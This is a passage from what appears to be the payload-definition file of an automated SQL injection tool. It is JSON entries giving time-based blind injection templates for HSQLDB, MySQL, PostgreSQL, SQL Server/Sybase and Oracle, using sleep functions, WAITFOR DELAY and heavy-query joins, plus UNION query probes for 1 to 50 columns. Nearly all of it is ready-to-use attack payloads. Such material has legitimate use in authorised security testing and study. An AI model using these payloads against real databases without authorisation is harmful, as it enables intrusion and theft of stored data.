REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}, {"where": [1], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))", "risk": 2, "level": 5, "clause": [1, 2, 3], "title": "HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))", "risk": 1, "level": 3, "clause": [2, 3], "title": "MySQL >= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.11"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))", "risk": 2, "level": 4, "clause": [2, 3], "title": "MySQL < 5.0.12 time-based blind - GROUP BY and ORDER BY clauses (heavy query)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))", "risk": 1, "level": 3, "clause": [2, 3], "title": "PostgreSQL > 8.1 time-based blind - GROUP BY and ORDER BY clauses", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))", "risk": 2, "level": 4, "clause": [2, 3], "title": "PostgreSQL time-based blind - GROUP BY and ORDER BY clauses (heavy query)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "PostgreSQL"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))", "risk": 1, "level": 3, "clause": [2, 3], "title": "Microsoft SQL Server/Sybase time-based blind - ORDER BY clauses", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))", "risk": 2, "level": 4, "clause": [2, 3], "title": "Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": ",(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)", "risk": 0, "level": 3, "clause": [2, 3], "title": "Oracle time-based blind - GROUP BY and ORDER BY clauses (DBMS_LOCK.SLEEP)", "request": {"payload": ",(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)", "risk": 1, "level": 3, "clause": [2, 3], "title": "Oracle time-based blind - GROUP BY and ORDER BY clauses (DBMS_PIPE.RECEIVE_MESSAGE)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"time": "[SLEEPTIME]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)", "risk": 2, "level": 4, "clause": [2, 3], "title": "Oracle time-based blind - GROUP BY and ORDER BY clauses (heavy query)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)", "risk": 2, "level": 4, "clause": [2, 3], "title": "HSQLDB >= 1.7.2 time-based blind - GROUP BY and ORDER BY clauses (heavy query)", "request": {"comment": "--", "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))", "risk": 2, "level": 4, "clause": [2, 3], "title": "HSQLDB > 2.0 time-based blind - GROUP BY and ORDER BY clauses (heavy query)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))"}, "response": {"time": "[DELAYED]"}, "stype": 5, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 1, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom)", "request": {"comment": "#", "char": "[CHAR]", "payload": null, "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 1, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom)", "request": {"comment": "#", "char": "NULL", "payload": null, "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom)", "request": {"comment": "#", "char": "[RANDNUM]", "payload": null, "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 1, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([CHAR]) - 1 to 10 columns", "request": {"comment": "#", "char": "[CHAR]", "payload": null, "columns": "1-10"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 1, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query (NULL) - 1 to 10 columns", "request": {"comment": "#", "char": "NULL", "payload": null, "columns": "1-10"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([RANDNUM]) - 1 to 10 columns", "request": {"comment": "#", "char": "[RANDNUM]", "payload": null, "columns": "1-10"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 2, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([CHAR]) - 11 to 20 columns", "request": {"comment": "#", "char": "[CHAR]", "payload": null, "columns": "11-20"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 2, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query (NULL) - 11 to 20 columns", "request": {"comment": "#", "char": "NULL", "payload": null, "columns": "11-20"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([RANDNUM]) - 11 to 20 columns", "request": {"comment": "#", "char": "[RANDNUM]", "payload": null, "columns": "11-20"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([CHAR]) - 21 to 30 columns", "request": {"comment": "#", "char": "[CHAR]", "payload": null, "columns": "21-30"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query (NULL) - 21 to 30 columns", "request": {"comment": "#", "char": "NULL", "payload": null, "columns": "21-30"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 4, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([RANDNUM]) - 21 to 30 columns", "request": {"comment": "#", "char": "[RANDNUM]", "payload": null, "columns": "21-30"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 4, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([CHAR]) - 31 to 40 columns", "request": {"comment": "#", "char": "[CHAR]", "payload": null, "columns": "31-40"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 4, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query (NULL) - 31 to 40 columns", "request": {"comment": "#", "char": "NULL", "payload": null, "columns": "31-40"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 5, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([RANDNUM]) - 31 to 40 columns", "request": {"comment": "#", "char": "[RANDNUM]", "payload": null, "columns": "31-40"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 5, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([CHAR]) - 41 to 50 columns", "request": {"comment": "#", "char": "[CHAR]", "payload": null, "columns": "41-50"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 5, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query (NULL) - 41 to 50 columns", "request": {"comment": "#", "char": "NULL", "payload": null, "columns": "41-50"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 5, "clause": [1, 2, 3, 4, 5], "title": "MySQL UNION query ([RANDNUM]) - 41 to 50 columns", "request": {"comment": "#", "char": "[RANDNUM]", "payload": null, "columns": "41-50"}, "response": {"union": null}, "stype": 3, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 1, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom)", "request": {"comment": "-- ", "char": "[CHAR]", "payload": null, "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 1, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom)", "request": {"comment": "-- ", "char": "NULL", "payload": null, "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom)", "request": {"comment": "-- ", "char": "[RANDNUM]", "payload": null, "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 1, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([CHAR]) - 1 to 10 columns", "request": {"comment": "-- ", "char": "[CHAR]", "payload": null, "columns": "1-10"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 1, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query (NULL) - 1 to 10 columns", "request": {"comment": "-- ", "char": "NULL", "payload": null, "columns": "1-10"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([RANDNUM]) - 1 to 10 columns", "request": {"comment": "-- ", "char": "[RANDNUM]", "payload": null, "columns": "1-10"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 2, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([CHAR]) - 11 to 20 columns", "request": {"comment": "-- ", "char": "[CHAR]", "payload": null, "columns": "11-20"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 2, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query (NULL) - 11 to 20 columns", "request": {"comment": "-- ", "char": "NULL", "payload": null, "columns": "11-20"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([RANDNUM]) - 11 to 20 columns", "request": {"comment": "-- ", "char": "[RANDNUM]", "payload": null, "columns": "11-20"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([CHAR]) - 21 to 30 columns", "request": {"comment": "-- ", "char": "[CHAR]", "payload": null, "columns": "21-30"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 3, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query (NULL) - 21 to 30 columns", "request": {"comment": "-- ", "char": "NULL", "payload": null, "columns": "21-30"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 4, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([RANDNUM]) - 21 to 30 columns", "request": {"comment": "-- ", "char": "[RANDNUM]", "payload": null, "columns": "21-30"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 4, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([CHAR]) - 31 to 40 columns", "request": {"comment": "-- ", "char": "[CHAR]", "payload": null, "columns": "31-40"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 4, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query (NULL) - 31 to 40 columns", "request": {"comment": "-- ", "char": "NULL", "payload": null, "columns": "31-40"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 5, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([RANDNUM]) - 31 to 40 columns", "request": {"comment": "-- ", "char": "[RANDNUM]", "payload": null, "columns": "31-40"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 5, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([CHAR]) - 41 to 50 columns", "request": {"comment": "-- ", "char": "[CHAR]", "payload": null, "columns": "41-50"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 5, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query (NULL) - 41 to 50 columns", "request": {"comment": "-- ", "char": "NULL", "payload": null, "columns": "41-50"}, "response": {"union": null}, "stype": 3}, {"where": [1], "vector": "[UNION]", "risk": 1, "level": 5, "clause": [1, 2, 3, 4, 5], "title": "Generic UNION query ([RANDNUM]) - 41 to 50 columns", "request": {"comment": "-- ", "char": "[RANDNUM]", "payload": null, "columns": "41-50"}, "response": {"union": null}, "stype": 3}]